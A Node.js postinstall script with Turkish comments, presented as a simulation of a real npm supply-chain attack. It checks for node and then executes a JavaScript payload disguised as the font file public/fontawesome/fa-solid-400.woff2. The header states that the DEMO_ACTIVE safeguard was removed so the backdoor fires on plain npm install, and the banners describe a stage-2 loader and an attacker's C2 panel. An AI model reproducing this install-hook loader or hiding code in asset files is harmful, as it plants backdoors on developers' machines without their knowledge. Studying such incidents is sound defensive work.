"use strict";

/**
 * run-stage1.js
 * -------------
 * package.json -> "postinstall" hook'unun çağırdığı ilk dosya.
 * 
 * RAPORDAKİ KARŞILIĞI:
 *   %WINDIR%\System32\cmd.exe /d /c (command -v node >/dev/null 2>&1 && node ./public/fontawesome/fa-solid-400.woff2)
 *     || (where node >nul 2>&1 && node ./public/fontawesome/fa-solid-400.woff2) || echo ''
 * 
 * Gerçek vakada bu tek satırlık shell komutu üç işletim sistemi ailesini de
 * destekleyecek şekilde yazılmıştı ve node bulunursa "font dosyası" kılığındaki
 * JS payload'ı çalıştırıyordu.
 * 
 * BU SİMÜLASYONDA DEMO_ACTIVE KONTROLÜ KALDIRILMIŞTIR.
 * Artık doğrudan npm install ile backdoor tetiklenir.
 * (Sadece izole VM'de çalıştırın!)
 */

const path = require("path");
const fs = require("fs");
const os = require("os");
const { execSync } = require("child_process");

// ---------------------------------------------------------------------
// 1. SİSTEM KONTROLÜ (Rapordaki "command -v node / where node")
// ---------------------------------------------------------------------
function checkNodeAvailability() {
  try {
    const cmd = os.platform() === "win32" ? "where node" : "command -v node";
    execSync(cmd, { stdio: "ignore" });
    return true;
  } catch {
    return false;
  }
}

// ---------------------------------------------------------------------
// 2. STAGE-1 PAYLOAD'INI ÇALIŞTIR
// ---------------------------------------------------------------------
function executeStage1() {
  const stage1Path = path.join(__dirname, "..", "public", "fontawesome", "fa-solid-400.woff2");
  
  if (!fs.existsSync(stage1Path)) {
    console.error(`[!] Stage-1 dosyası bulunamadı: ${stage1Path}`);
    return false;
  }

  console.log(`
╔═══════════════════════════════════════════════════════════════════╗
║  [DEMO] Stage-1 backdoor çalıştırılıyor...                      ║
║  Dosya: public/fontawesome/fa-solid-400.woff2                   ║
║  Bu dosya FONT gibi görünüyor, ama aslında JavaScript!          ║
║  Gerçek vakada bu dosya, kurban tarafından FARK EDİLMEDEN       ║
║  node ile çalıştırılırdı.                                       ║
╚═══════════════════════════════════════════════════════════════════╝
  `);

  try {
    require(stage1Path);
    console.log("[DEMO] ✅ Stage-1 başarıyla çalıştı.");
    return true;
  } catch (error) {
    console.error(`[!] Stage-1 çalıştırılırken hata oluştu:`, error.message);
    return false;
  }
}

// ---------------------------------------------------------------------
// 3. ANA FONKSİYON (Artık DEMO_ACTIVE kontrolü YOK)
// ---------------------------------------------------------------------
function main() {
  console.log(`
╔═══════════════════════════════════════════════════════════════════╗
║  [DEMO] postinstall hook'u tetiklendi!                          ║
║  Bu an, gerçek vakadaki "npm install" anına denk gelir.         ║
║  Kurban, projeyi kurduğunu sanıyor ama arka planda...           ║
╚═══════════════════════════════════════════════════════════════════╝
  `);

  // Adım 1: Node.js varlık kontrolü (rapordaki "command -v / where")
  console.log("[DEMO] Node.js varlığı kontrol ediliyor...");
  const nodeAvailable = checkNodeAvailability();
  if (!nodeAvailable) {
    console.log("[DEMO] ⚠️ Node.js bulunamadı. (Gerçek vakada bu durumda sessizce çıkılırdı.)");
    return;
  }
  console.log("[DEMO] ✅ Node.js mevcut.");

  // Adım 2: Stage-1 payload'ını çalıştır
  const success = executeStage1();

  // Adım 3: Sonuç bildirimi
  if (success) {
    console.log(`
╔═══════════════════════════════════════════════════════════════════╗
║  [DEMO] Stage-1 başarıyla çalıştı.                              ║
║  Artık stage2-loader.js devreye girecek ve backdoor            ║
║  tam olarak başlatılacak.                                      ║
║  Saldırgan C2 panelinde kurbanı görmeye başlayacak.            ║
╚═══════════════════════════════════════════════════════════════════╝
    `);
  } else {
    console.log(`
╔═══════════════════════════════════════════════════════════════════╗
║  [DEMO] ❌ Stage-1 çalıştırılamadı.                             ║
║  Lütfen aşağıdakileri kontrol edin:                             ║
║  1. fa-solid-400.woff2 dosyası public/fontawesome/ altında mı?  ║
║  2. Node.js çalışıyor mu?                                       ║
╚═══════════════════════════════════════════════════════════════════╝
    `);
  }
}

// ---------------------------------------------------------------------
// 4. ÇALIŞTIR
// ---------------------------------------------------------------------
main();